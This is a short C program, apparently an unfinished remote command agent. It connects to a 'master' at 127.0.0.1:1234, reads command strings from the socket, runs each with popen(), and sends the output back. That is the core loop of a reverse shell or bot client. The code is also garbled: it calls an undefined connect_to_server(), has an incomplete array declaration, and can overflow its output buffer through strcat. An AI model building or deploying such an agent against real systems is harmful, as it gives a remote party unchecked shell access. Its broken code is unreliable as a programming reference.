#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>

int sock_fd;

int connect_to_master () {
	int error = 0;

	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;  // TCP

	error = getaddrinfo("127.0.0.1", "1234", &hints, &res);
		if (error) {
			printf("Failed getaddrinfo(): %s\n", gai_strerror(error));
			return -1;
		}
	sock_fd = socket(res->ai_family, res->ai_socktype, 0);
		if (sock_fd == -1) {
			printf("Failed socket()\n");
			return -1;
		}
	error = connect(sock_fd, res->ai_addr, res->ai_addrlen);
		if (error == -1) {
			printf("Failed connect()\n");
			return -1;
		}
	
	return 0;
}

int main (int argc, char **argv) {
	int error = 0;

	connect_to_server();
		if (error) {
			printf("Failed connect_to_server()\n");
			return -1;
		}

	while (1) {
		char buf_length[5];
		int buf_length_len = read(sock_fd, buf_length, 4);
			if (buf_length_len != 4) {
				printf("Command corrupted\n");
				return -1;
			}

		char buf_opcode[
		char cmd_buf[1024];
		int cmd_len = read(sock_fd, cmd_buf, 1023);
		cmd_buf[cmd_len] = '\0';

		FILE *fp = popen(cmd_buf, "r");
		if (!fp) {
			printf("Failed to run command\n");
			continue;
		}

		char out_buf[1024];
		out_buf[0] = 0;
		char tmp_buf[1024];
		while (fgets(tmp_buf, sizeof(tmp_buf), fp)) {
			strcat(out_buf, tmp_buf);
		}
		
		write(sock_fd, out_buf, strlen(out_buf));
	}

	return 0;
}

